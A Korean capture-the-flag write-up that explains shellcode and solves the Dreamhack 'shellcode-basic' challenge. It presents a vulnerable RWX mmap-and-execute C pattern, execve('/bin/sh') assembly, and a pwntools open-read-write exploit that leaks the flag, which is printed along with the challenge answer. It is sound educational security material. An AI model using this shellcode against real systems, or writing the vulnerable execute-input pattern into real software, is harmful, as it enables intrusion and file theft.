---
title: "Shellcode Basic"
date: 2026-06-17
categories: [Writeup, System]
tags: [System, Shellcode, SandBox, seccomp, ORW]
description: mmap으로 할당된 실행 가능한 메모리에 셸코드를 직접 주입
image:
  path: /assets/img/posts/shellCode/logo.png
  alt: thumbnail
---

## Concept

셸코드(Shellcode)란 **기계어(machine code)로 작성된 작은 코드 조각**으로, 취약점을 통해 프로세스의 메모리에 직접 주입되어 실행되는 코드이다. 이름의 유래는 초기에 주로 `/bin/sh` 셸을 획득하는 데 사용되었기 때문이며, 현재는 임의의 시스템 콜 실행, 파일 읽기, 역방향 연결 등 더 넓은 의미로 쓰인다. 이 기법은 실행 가능한 메모리 영역이 존재하고 입력값이 해당 영역에 복사된 뒤 제어 흐름이 이동될 때 공격이 성립한다.

---

## 발생 원인

셸코드 공격이 가능한 근본 원인은 두 가지이다.

1. **실행 가능한 메모리(Executable Memory)** 가 존재하고 공격자의 입력이 그곳에 기록될 때
2. **입력값 검증 없이 해당 주소로 분기(call/jmp)** 할 때

아래는 전형적인 취약 패턴이다.

```c
// 취약한 코드
void *buf = mmap(NULL, 0x1000,
                 PROT_READ | PROT_WRITE | PROT_EXEC,  // 실행 권한 부여
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

read(0, buf, 0x1000);   // 사용자 입력을 그대로 기록

void (*sc)() = buf;
sc();                   // 검증 없이 실행 -> 셸코드 실행
```

안전한 대안은 다음과 같다.

```c
// 쓰기 단계와 실행 단계를 분리
void *buf = mmap(NULL, 0x1000,
                 PROT_READ | PROT_WRITE,   // 실행 권한 없이 쓰기
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

read(0, buf, 0x1000);

// 쓰기 권한 제거 후 실행 권한 부여 (W^X 정책)
mprotect(buf, 0x1000, PROT_READ | PROT_EXEC);
// 그래도 임의 코드 실행 자체를 허용하는 것은 위험하다
```

---

## 메모리 구조와의 관계

`mmap`으로 할당된 실행 가능한 익명 페이지에 셸코드가 놓이고, 함수 포인터를 통해 제어 흐름이 이동한다.

```
[ 낮은 주소 ]
+-----------------------------+
|  .text (프로그램 코드)       |
+-----------------------------+
|  .data / .bss               |
+-----------------------------+
|  힙 (heap)                  |
+-----------------------------+
|         ...                 |
+-----------------------------+
|  mmap 영역 (PROT_RWX)       |  ← 셸코드가 여기에 write 됨
|  [셸코드 바이트열]           |  ← sc() 호출 시 CPU가 여기서 실행
+-----------------------------+
|  스택 (stack)               |
|  [지역 변수, 반환 주소 등]   |
+-----------------------------+
[ 높은 주소 ]
```

`sc = (void *)shellcode` 로 함수 포인터를 설정한 뒤 `sc()` 를 호출하면, `call rdx` 명령어로 mmap 영역의 첫 바이트로 분기하여 공격자의 코드가 그대로 실행된다.

---

## execve / execveat 와 SandBox (seccomp)

### execve란?

`execve`는 현재 프로세스를 새로운 프로그램으로 교체하는 리눅스 시스템 콜이다. 셸코드에서 가장 많이 사용되는 패턴은 다음과 같다.

```c
execve("/bin/sh", NULL, NULL);  // 시스템 콜 번호 59 (x86-64)
```

어셈블리 레벨에서는 아래와 같이 표현된다.

```nasm
xor    rax, rax
push   rax                    ; NULL terminator
mov    rbx, 0x68732f6e69622f2f ; "//bin/sh"
push   rbx
mov    rdi, rsp               ; rdi = "/bin/sh"
xor    rsi, rsi               ; argv = NULL
xor    rdx, rdx               ; envp = NULL
mov    al, 59                 ; syscall number: execve
syscall
```

### objdump로 셸코드 바이트 확인

작성한 셸코드를 검증하거나 바이트 열을 추출할 때 `objdump`를 활용한다.

```bash
# 어셈블 후 바이트 추출
nasm -f elf64 shellcode.asm -o shellcode.o
objdump -d shellcode.o
```

출력 예시:
```
0000000000000000 <_start>:
   0: 48 31 c0     xor    rax,rax
   3: 50           push   rax
   4: 48 bb 2f 2f  movabs rbx,0x68732f6e69622f2f
      62 69 6e 2f
      73 68
   e: 53           push   rbx
   f: 48 89 e7     mov    rdi,rsp
  12: b0 3b        mov    al,0x3b
  14: 0f 05        syscall
```

바이트 열만 추출하는 명령어:
```bash
objdump -d shellcode.o | grep -Po '\s\K[0-9a-f]{2}(?=\s)' | \
  tr '\n' ' ' | sed 's/ /\\x/g'
```

---

## 공격 방식
**execve 셸코드** - `/bin/sh` 실행으로 쉘 획득 (seccomp 없을 때)
**ORW 셸코드** - `open → read → write` 순서로 파일 직접 읽기
**Reverse Shell** - 공격자 서버로 역방향 연결

이 문제는 `execve` / `execveat` 가 차단되어 있으므로 **ORW 셸코드**로 플래그 파일을 직접 읽어야 한다.

---

## 문제

**shellcode-basic** 문제는 실행 가능한 메모리(`mmap PROT_RWX`)에 사용자의 셸코드를 직접 입력받아 실행하는 서버에 ORW 셸코드를 전송하여 플래그를 획득하는 문제이다. 단, `seccomp` 필터로 `execve` / `execveat` 시스템 콜이 차단되어 있어 단순한 `/bin/sh` 획득은 불가능하다.

---

## 서비스 분석

```c
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    if (ctx == NULL) {
        exit(0);
    }
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

    seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
    char *shellcode = mmap(NULL, 0x1000,
                           PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    void (*sc)();

    init();

    banned_execve();

    printf("shellcode: ");
    read(0, shellcode, 0x1000);   // ← 취약 지점

    sc = (void *)shellcode;
    sc();                         // ← 입력값 그대로 실행
}
```
{: file="shell_basic.c"}

취약점
- `mmap`으로 `PROT_READ | PROT_WRITE | PROT_EXEC` 권한이 부여된 영역을 할당
- `read(0, shellcode, 0x1000)` 으로 표준 입력을 해당 영역에 그대로 기록한 뒤, `sc()` 로 즉시 실행

입력값 길이 제한(0x1000 = 4096바이트)이 있을 뿐, 내용에 대한 검증이 전혀 없으므로 임의의 기계어를 실행시킬 수 있다. (`banned_execve()`가 먼저 호출되어 `execve` / `execveat`는 사용할 수 없다.)

---

## 익스플로잇

### ATK Step

`execve`가 차단되어 있으므로 **ORW(Open → Read → Write) 기법**으로 플래그 파일을 직접 읽는다.

1. `open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY)` — 파일 디스크립터(fd) 획득
2. `read(fd, rsp, 0x30)` — 스택에 플래그 내용 읽기 (`rax`에 반환된 fd 사용)
3. `write(1, rsp, 0x30)` — 표준 출력(fd=1)으로 플래그 출력

### 오프셋 / 주소 계산

별도의 오프셋 계산은 필요 없다. `pwntools`의 `shellcraft` 모듈이 상대 주소 기반의 위치 독립적(PIC) 셸코드를 자동 생성하며, `rax` 에 `open`의 반환값(fd)이 저장되므로 이를 그대로 `read`의 첫 번째 인자로 전달한다.

```
open(path) → rax = fd
read(rax, rsp, 0x30)  ← fd로 파일 읽기, 스택에 저장
write(1, rsp, 0x30)   ← stdout으로 출력
```

### 최종 익스플로잇

```python
from pwn import *

p = remote("host3.dreamhack.games", 20702)
context.arch = "amd64"

dir = "/home/shell_basic/flag_name_is_loooooong"

shellcode  = shellcraft.open(dir)           # open syscall
shellcode += shellcraft.read('rax', 'rsp', 0x30)  # read(fd, rsp, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)     # write(1, rsp, 0x30)

p.sendlineafter(b"shellcode: ", asm(shellcode))

p.interactive()
```
{: file="payload.py"}

### 실행 결과

서버 연결 후 셸코드를 전송하면 다음과 같이 플래그가 출력된다.

![flag](/assets/img/posts/shellCode/flag.png)

> `DH{ca562d7cf1db6c55cb11c4ec350a3c0b}`